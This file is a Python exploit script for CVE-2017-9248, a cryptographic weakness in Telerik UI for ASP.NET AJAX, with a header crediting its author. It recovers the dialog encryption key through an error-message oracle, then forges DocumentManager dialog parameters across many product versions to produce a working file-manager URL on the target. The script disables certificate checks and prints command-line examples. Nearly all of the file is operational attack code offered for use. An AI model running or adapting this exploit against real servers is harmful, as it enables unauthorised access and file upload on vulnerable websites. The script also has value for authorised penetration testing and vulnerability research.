# Filename: dp_crypto.py
# Github: https://github.com/bao7uo/dp_crypto
# Date: 2018-01-23

# Exploit Author: Paul Taylor / Foregenix Ltd
# Website: http://www.foregenix.com/blog

# Version: Telerik UI for ASP.NET AJAX
# CVE: CVE-2017-9248
# Vendor Advisory: https://www.telerik.com/support/kb/aspnet-ajax/details/cryptographic-weakness

# Tested on: Working on versions 2012.3.1308 thru 2017.1.118 (.NET 35, 40, 45)

#!/usr/bin/python3

# Author: Paul Taylor / Foregenix Ltd

# https://github.com/bao7uo/dp_crypto/blob/master/dp_crypto.py

# dp_crypto - CVE-2017-9248 exploit
# Telerik.Web.UI.dll Cryptographic compromise

# Warning - no cert warnings,
# and verify = False in code below prevents verification

import sys
import base64
import requests
import re
import binascii

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

requests_sent = 0
char_requests = 0


def get_result(plaintext, key, session, pad_chars):
    global requests_sent, char_requests

    url = sys.argv[2]
    base_pad = (len(key) % 4)
    base = &#039;&#039; if base_pad == 0 else pad_chars[0:4 - base_pad]
    dp_encrypted = base64.b64encode(
                                (encrypt(plaintext, key) + base).encode()
                            ).decode()
    request = requests.Request(&#039;GET&#039;, url + &#039;?dp=&#039; + dp_encrypted)
    request = request.prepare()
    response = session.send(request, verify=False)
    requests_sent += 1
    char_requests += 1

    match = re.search(&quot;(Error Message:)(.+\n*.+)(&lt;/div&gt;)&quot;, response.text)
    return True \
        if match is not None \
        and match.group(2) == &quot;Index was outside the bounds of the array.&quot; \
        else False


def test_keychar(keychar, found, session, pad_chars):
    base64chars = [
                    &quot;A&quot;, &quot;Q&quot;, &quot;g&quot;, &quot;w&quot;, &quot;B&quot;, &quot;R&quot;, &quot;h&quot;, &quot;x&quot;, &quot;C&quot;, &quot;S&quot;, &quot;i&quot;, &quot;y&quot;,
                    &quot;D&quot;, &quot;T&quot;, &quot;j&quot;, &quot;z&quot;, &quot;E&quot;, &quot;U&quot;, &quot;k&quot;, &quot;0&quot;, &quot;F&quot;, &quot;V&quot;, &quot;l&quot;, &quot;1&quot;,
                    &quot;G&quot;, &quot;W&quot;, &quot;m&quot;, &quot;2&quot;, &quot;H&quot;, &quot;X&quot;, &quot;n&quot;, &quot;3&quot;, &quot;I&quot;, &quot;Y&quot;, &quot;o&quot;, &quot;4&quot;,
                    &quot;J&quot;, &quot;Z&quot;, &quot;p&quot;, &quot;5&quot;, &quot;K&quot;, &quot;a&quot;, &quot;q&quot;, &quot;6&quot;, &quot;L&quot;, &quot;b&quot;, &quot;r&quot;, &quot;7&quot;,
                    &quot;M&quot;, &quot;c&quot;, &quot;s&quot;, &quot;8&quot;, &quot;N&quot;, &quot;d&quot;, &quot;t&quot;, &quot;9&quot;, &quot;O&quot;, &quot;e&quot;, &quot;u&quot;, &quot;+&quot;,
                    &quot;P&quot;, &quot;f&quot;, &quot;v&quot;, &quot;/&quot;
                  ]

    duff = False
    accuracy_thoroughness_threshold = sys.argv[5]
    for bc in range(int(accuracy_thoroughness_threshold)):
                                                # ^^ max is len(base64chars)
        sys.stdout.write(&quot;\b\b&quot; + base64chars[bc] + &quot;]&quot;)
        sys.stdout.flush()
        if not get_result(
                      base64chars[0] * len(found) + base64chars[bc],
                      found + keychar, session, pad_chars
                      ):
            duff = True
            break
    return False if duff else True


def encrypt(dpdata, key):
    encrypted = []
    k = 0
    for i in range(len(dpdata)):
        encrypted.append(chr(ord(dpdata[i]) ^ ord(key[k])))
        k = 0 if k &gt;= len(key) - 1 else k + 1
    return &#039;&#039;.join(str(e) for e in encrypted)


def mode_decrypt():
    ciphertext = base64.b64decode(sys.argv[2].encode()).decode()
    key = sys.argv[3]
    print(base64.b64decode(encrypt(ciphertext, key)).decode())
    print(&quot;&quot;)


def mode_encrypt():
    plaintext = sys.argv[2]
    key = sys.argv[3]

    plaintext = base64.b64encode(plaintext.encode()).decode()
    print(base64.b64encode(encrypt(plaintext, key).encode()).decode())
    print(&quot;&quot;)


def test_keypos(key_charset, unprintable, found, session):
    pad_chars = &#039;&#039;
    for pad_char in range(256):
        pad_chars += chr(pad_char)

    for i in range(len(pad_chars)):
        for k in range(len(key_charset)):
            keychar = key_charset[k]
            sys.stdout.write(&quot;\b&quot;*6)
            sys.stdout.write(
                        (
                            keychar
                            if unprintable is False
                            else &#039;+&#039;
                        ) +
                        &quot;) [&quot; + (
                            keychar
                            if unprintable is False
                            else &#039;+&#039;
                        ) +
                        &quot;]&quot;
                    )
            sys.stdout.flush()
            if test_keychar(keychar, found, session, pad_chars[i] * 3):
                return keychar
    return False


def get_key(session):
    global char_requests
    found = &#039;&#039;
    unprintable = False

    key_length = sys.argv[3]
    key_charset = sys.argv[4]
    if key_charset == &#039;all&#039;:
        unprintable = True
        key_charset = &#039;&#039;
        for i in range(256):
            key_charset += chr(i)
    else:
        if key_charset == &#039;hex&#039;:
            key_charset = &#039;01234567890ABCDEF&#039;

    print(&quot;Attacking &quot; + sys.argv[2])
    print(
        &quot;to find key of length [&quot; +
        str(key_length) +
        &quot;] with accuracy threshold [&quot; +
        sys.argv[5] +
        &quot;]&quot;
    )
    print(
        &quot;using key charset [&quot; +
        (
            key_charset
            if unprintable is False
            else &#039;- all ASCII -&#039;
        ) +
        &quot;]\n&quot;
    )
    for i in range(int(key_length)):
        pos_str = (
            str(i + 1)
            if i &gt; 8
            else &quot;0&quot; + str(i + 1)
        )
        sys.stdout.write(&quot;Key position &quot; + pos_str + &quot;: (------&quot;)
        sys.stdout.flush()
        keychar = test_keypos(key_charset, unprintable, found, session)
        if keychar is not False:
            found = found + keychar
            sys.stdout.write(
                          &quot;\b&quot;*7 + &quot;{&quot; +
                          (
                              keychar
                              if unprintable is False
                              else &#039;0x&#039; + binascii.hexlify(keychar.encode()).decode()
                          ) +
                          &quot;} found with &quot; +
                          str(char_requests) +
                          &quot; requests, total so far: &quot; +
                          str(requests_sent) +
                          &quot;\n&quot;
                      )
            sys.stdout.flush()
            char_requests = 0
        else:
            sys.stdout.write(&quot;\b&quot;*7 + &quot;Not found, quitting\n&quot;)
            sys.stdout.flush()
            break
    if keychar is not False:
        print(&quot;Found key: &quot; +
              (
                found
                if unprintable is False
                else &quot;(hex) &quot; + binascii.hexlify(found.encode()).decode()
              )
              )
    print(&quot;Total web requests: &quot; + str(requests_sent))
    return found


def mode_brutekey():
    session = requests.Session()
    found = get_key(session)

    if found == &#039;&#039;:
        return
    else:
        urls = {}
        url_path = sys.argv[2]
        params = (
                    &#039;?DialogName=DocumentManager&#039; +
                    &#039;&amp;renderMode=2&#039; +
                    &#039;&amp;Skin=Default&#039; +
                    &#039;&amp;Title=Document%20Manager&#039; +
                    &#039;&amp;dpptn=&#039; +
                    &#039;&amp;isRtl=false&#039; +
                    &#039;&amp;dp=&#039;
                  )
        versions = [
                    &#039;2007.1423&#039;, &#039;2007.1521&#039;, &#039;2007.1626&#039;, &#039;2007.2918&#039;,
                    &#039;2007.21010&#039;, &#039;2007.21107&#039;, &#039;2007.31218&#039;, &#039;2007.31314&#039;,
                    &#039;2007.31425&#039;, &#039;2008.1415&#039;, &#039;2008.1515&#039;, &#039;2008.1619&#039;,
                    &#039;2008.2723&#039;, &#039;2008.2826&#039;, &#039;2008.21001&#039;, &#039;2008.31105&#039;,
                    &#039;2008.31125&#039;, &#039;2008.31314&#039;, &#039;2009.1311&#039;, &#039;2009.1402&#039;,
                    &#039;2009.1527&#039;, &#039;2009.2701&#039;, &#039;2009.2826&#039;, &#039;2009.31103&#039;,
                    &#039;2009.31208&#039;, &#039;2009.31314&#039;, &#039;2010.1309&#039;, &#039;2010.1415&#039;,
                    &#039;2010.1519&#039;, &#039;2010.2713&#039;, &#039;2010.2826&#039;, &#039;2010.2929&#039;,
                    &#039;2010.31109&#039;, &#039;2010.31215&#039;, &#039;2010.31317&#039;, &#039;2011.1315&#039;,
                    &#039;2011.1413&#039;, &#039;2011.1519&#039;, &#039;2011.2712&#039;, &#039;2011.2915&#039;,
                    &#039;2011.31115&#039;, &#039;2011.3.1305&#039;, &#039;2012.1.215&#039;, &#039;2012.1.411&#039;,
                    &#039;2012.2.607&#039;, &#039;2012.2.724&#039;, &#039;2012.2.912&#039;, &#039;2012.3.1016&#039;,
                    &#039;2012.3.1205&#039;, &#039;2012.3.1308&#039;, &#039;2013.1.220&#039;, &#039;2013.1.403&#039;,
                    &#039;2013.1.417&#039;, &#039;2013.2.611&#039;, &#039;2013.2.717&#039;, &#039;2013.3.1015&#039;,
                    &#039;2013.3.1114&#039;, &#039;2013.3.1324&#039;, &#039;2014.1.225&#039;, &#039;2014.1.403&#039;,
                    &#039;2014.2.618&#039;, &#039;2014.2.724&#039;, &#039;2014.3.1024&#039;, &#039;2015.1.204&#039;,
                    &#039;2015.1.225&#039;, &#039;2015.1.401&#039;, &#039;2015.2.604&#039;, &#039;2015.2.623&#039;,
                    &#039;2015.2.729&#039;, &#039;2015.2.826&#039;, &#039;2015.3.930&#039;, &#039;2015.3.1111&#039;,
                    &#039;2016.1.113&#039;, &#039;2016.1.225&#039;, &#039;2016.2.504&#039;, &#039;2016.2.607&#039;,
                    &#039;2016.3.914&#039;, &#039;2016.3.1018&#039;, &#039;2016.3.1027&#039;, &#039;2017.1.118&#039;,
                    &#039;2017.1.228&#039;, &#039;2017.2.503&#039;, &#039;2017.2.621&#039;, &#039;2017.2.711&#039;,
                    &#039;2017.3.913&#039;
                    ]

        plaintext1 = &#039;EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,&#039;
        plaintext2_raw1 = &#039;Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version=&#039;
        plaintext2_raw3 = &#039;, Culture=neutral, PublicKeyToken=121fae78165ba3d4&#039;
        plaintext3 = &#039;;AllowMultipleSelection,False,3,False&#039;

        for version in versions:
            plaintext2_raw2 = version
            plaintext2 = base64.b64encode(
                            (plaintext2_raw1 +
                                plaintext2_raw2 +
                                plaintext2_raw3
                             ).encode()
                        ).decode()
            plaintext = plaintext1 + plaintext2 + plaintext3
            plaintext = base64.b64encode(
                            plaintext.encode()
                        ).decode()
            ciphertext = base64.b64encode(
                            encrypt(
                                plaintext,
                                found
                            ).encode()
                        ).decode()
            full_url = url_path + params + ciphertext
            urls[version] = full_url

        found_valid_version = False
        for version in urls:
            url = urls[version]
            request = requests.Request(&#039;GET&#039;, url)
            request = request.prepare()
            response = session.send(request, verify=False)
            if response.status_code == 500:
                continue
            else:
                match = re.search(
                    &quot;(Error Message:)(.+\n*.+)(&lt;/div&gt;)&quot;,
                    response.text
                    )
                if match is None:
                    print(version + &quot;: &quot; + url)
                    found_valid_version = True
                    break

        if not found_valid_version:
            print(&quot;No valid version found&quot;)

def mode_samples():
    print(&quot;Samples for testing decryption and encryption functions:&quot;)
    print(&quot;-d ciphertext key&quot;)
    print(&quot;-e plaintext key&quot;)
    print(&quot;&quot;)
    print(&quot;Key:&quot;)
    print(&quot;DC50EEF37087D124578FD4E205EFACBE0D9C56607ADF522D&quot;)
    print(&quot;&quot;)
    print(&quot;Plaintext:&quot;)
    print(&quot;EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,VGVsZXJpay5XZWIuVUkuRWRpdG9yLkRpYWxvZ0NvbnRyb2xzLkRvY3VtZW50TWFuYWdlckRpYWxvZywgVGVsZXJpay5XZWIuVUksIFZlcnNpb249MjAxNi4yLjUwNC40MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0xMjFmYWU3ODE2NWJhM2Q0;AllowMultipleSelection,False,3,False&quot;)
    print(&quot;&quot;)
    print(&quot;Ciphertext:&quot;)
    print(&quot;FhQAWBwoPl9maHYCJlx8YlZwQDAdYxRBYlgDNSJxFzZ9PUEWVlhgXHhxFipXdWR0HhV3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMLciMVMnN9AFJ0Z2EDWG4sPCpnZQMtHhRnWx8SFHBuaHZbEQJgAVdwbjwlcxNeVHY9ARgUOj9qF045eXBkSVMWEXFgX2QxHgRjSRESf1htY0BwHWZKTm9kTz8IcAwFZm0HNSNxBC5lA39zVH57Q2EJDndvYUUzCAVFRBw/KmJiZwAOCwB8WGxvciwlcgdaVH0XKiIudz98Ams6UWFjQ3oCPBJ4X0EzHXJwCRURMnVVXX5eJnZkcldgcioecxdeanMLNCAUdz98AWMrV354XHsFCTVjenh1HhdBfhwdLmVUd0BBHWZgc1RgQCoRBikEamY9ARgUOj9qF047eXJ/R3kFIzF4dkYJJnF7WCcCKgVuaGpHJgMHZWxvaikIcR9aUn0LKg0HAzZ/dGMzV3Fgc1QsfXVWAGQ9FXEMRSECEEZTdnpOJgJoRG9wbj8SfClFamBwLiMUFzZiKX8wVgRjQ3oCM3FjX14oIHJ3WCECLkl7dmpOIGZnR3h0QCcmYwgHZXMDMBEXNg9TdXcxVGEDZVVyEixUcUoDHRRNSh8WMUl7dWJfJnl8WHoHbnIgcxNLUlgDNRMELi1SAwAtVgd0WFMGIzVnX3Q3J3FgQwgGMQRjd35CHgJkXG8FbTUWWQNBUwcQNQwAOiRmPmtzY1psfmcVMBNvZUooJy5ZQgkuFENuZ0BBHgFgWG9aVDMlbBdCUgdxMxMELi1SAwAtY35aR20UcS5XZWc3Fi5zQyZ3E0B6c0BgFgBoTmJbUA0ncwMHfmMtJxdzLnRmKG8xUWB8aGIvBi1nSF5xEARBYyYDKmtSeGJWCXQHBmxaDRUhYwxLVX01CyByCHdnEHcUUXBGaHkVBhNjAmh1ExVRWycCCEFiXnptEgJaBmJZVHUeBR96ZlsLJxYGMjJpHFJyYnBGaGQZEhFjZUY+FxZvUScCCEZjXnpeCVtjAWFgSAQhcXBCfn0pCyAvFHZkL3RzeHMHdFNzIBR4A2g+HgZdZyATNmZ6aG5WE3drQ2wFCQEnBD12YVkDLRdzMj9pEl0MYXBGaVUHEi94XGA3HS5aRyAAd0JlXQltEgBnTmEHagAJX3BqY1gtCAwvBzJ/dH8wV3EPA2MZEjVRdV4zJgRjZB8SPl9uA2pHJgMGR2dafjUnBhBBfUw9ARgUOj9qFQR+&quot;)
    print(&quot;&quot;)


def mode_b64e():
    print(base64.b64encode(sys.argv[2].encode()).decode())
    print(&quot;&quot;)


def mode_b64d():
    print(base64.b64decode(sys.argv[2].encode()).decode())
    print(&quot;&quot;)


def mode_help():
    print(&quot;Usage:&quot;)
    print(&quot;&quot;)
    print(&quot;Decrypt a ciphertext:        -d ciphertext key&quot;)
    print(&quot;Encrypt a plaintext:         -e plaintext key&quot;)
    print(&quot;Bruteforce key/generate URL: -k url key_length key_charset accuracy&quot;)
    print(&quot;Encode parameter to base64:  -b plain_parameter&quot;)
    print(&quot;Decode base64 parameter:     -p encoded_parameter&quot;)
    print(&quot;&quot;)
    print(&quot;To test all ascii characters set key_charset to: all, &quot; +
          &quot;for upper case hex (e.g. machine key) set to hex.&quot;)
    print(&quot;&quot;)
    print(&quot;Maximum accuracy is out of 64 where 64 is the most accurate, &quot; +
          &quot;accuracy of 9 will usually suffice for a hex, but 21 or more &quot; +
          &quot;might be needed when testing all ascii characters.&quot;)
    print(&quot;Increase the accuracy argument if no valid version is found.&quot;)
    print(&quot;&quot;)
    print(&quot;Examples to generate a valid file manager URL:&quot;)
    print(&quot;./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 hex 9&quot;)
    print(&quot;./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 all 21&quot;)
    print(&quot;&quot;)


sys.stderr.write(
              &quot;\ndp_crypto by Paul Taylor / Foregenix Ltd\nCVE-2017-9248 - &quot; +
              &quot;Telerik.Web.UI.dll Cryptographic compromise\n\n&quot;
            )

if len(sys.argv) &lt; 2:
    mode_help()

elif sys.argv[1] == &quot;-d&quot; and len(sys.argv) == 4:
    mode_decrypt()
elif sys.argv[1] == &quot;-e&quot; and len(sys.argv) == 4:
    mode_encrypt()
elif sys.argv[1] == &quot;-k&quot; and len(sys.argv) == 6:
    mode_brutekey()
elif sys.argv[1] == &quot;-s&quot; and len(sys.argv) == 2:
    mode_samples()
elif sys.argv[1] == &quot;-b&quot; and len(sys.argv) == 3:
    mode_b64e()
elif sys.argv[1] == &quot;-p&quot; and len(sys.argv) == 3:
    mode_b64d()
else:
    mode_help()
